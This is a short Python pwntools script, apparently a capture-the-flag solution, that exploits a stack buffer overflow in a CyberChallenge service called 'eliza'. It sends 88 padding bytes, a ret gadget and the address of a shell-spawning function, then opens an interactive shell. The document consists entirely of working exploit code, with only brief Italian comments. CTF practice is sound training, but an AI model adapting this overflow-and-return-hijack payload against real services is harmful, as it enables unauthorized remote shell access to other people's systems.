from pwn import *

p = remote('eliza.challs.cyberchallenge.it', 9131)

ret_gadget = 0x4006ee   # ret per stack alignment
sp4wn     = 0x400897    # sp4wn_4_sh311

payload  = b'A' * 88
payload += p64(ret_gadget)
payload += p64(sp4wn)

p.sendline(payload)   # overflow
p.sendline(b'')       # \n → esce dal loop → ret!

p.interactive()
